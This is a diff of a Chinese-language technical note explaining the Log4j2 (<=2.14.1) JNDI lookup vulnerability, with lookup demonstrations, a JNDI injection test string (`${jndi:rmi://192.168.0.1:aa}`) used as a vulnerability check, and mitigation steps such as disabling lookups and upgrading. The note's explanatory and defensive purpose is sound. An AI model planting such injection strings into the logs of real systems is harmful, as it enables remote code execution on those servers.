@@ -175,7 +175,7 @@ public static void main(String[] args) throws BadHanyuPinyinOutputFormatCombinat
 
 ### 重现
 
-``log4j`` <=2.14.1的版本会默认开启解析EL表达式，造成注入的风险。
+``log4j`` <=2.14.1的版本会默认开启开启[lookup功能](https://logging.apache.org/log4j/2.x/manual/lookups.html)，解析EL表达式，造成注入的风险。
 
 描述：Apache Log4j2 <=2.14.1 在配置、日志消息和参数中使用的 JNDI 功能不能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。当启用消息查找替换时，可以控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。从 log4j 2.15.0 开始，默认情况下已禁用此行为。
 
@@ -185,14 +185,14 @@ public static void main(String[] args) throws BadHanyuPinyinOutputFormatCombinat
 
 ```java
 public static void main(String[] args){
-		// 1.EL表达式演示
+		// 1.look up 功能演示
   	// 获取系统版本信息
   	logger.info("${java:os}");
     // 获取当前服务器硬件信息
    	logger.info("${java:hw}");
   	// ……等等
   
-  	// 2.利用EL表达式jndi注入
+  	// 2.jndi注入
   	// JNDI服务可以执行远程的class对象文件（可攻击破坏任意文件，执行删除、关机等等）。
   	// 此处没有搭JNDI服务，解析时会把aa当作端口解析，报错则说明试图调用远程JNDI服务，项目有此漏洞。
   	logger.info("${jndi:rmi://192.168.0.1:aa}")
@@ -208,7 +208,7 @@ public static void main(String[] args){
 log4j2.formatMsgNoLookups=true
 2.项目的父POM文件中的 properties 添加参数
 <log4j2.version>2.15.0</log4j2.version>
-3.打开idea自带的依赖图，找出所有依赖log4j-api和log4j-core的包，exclusion掉这两个依赖。（推荐插件maven helper）。
+3.打开idea自带的依赖图，找出所有依赖log4j-api和log4j-core的包，exclusion这两个依赖。（推荐插件maven helper）。
 ```
 
 
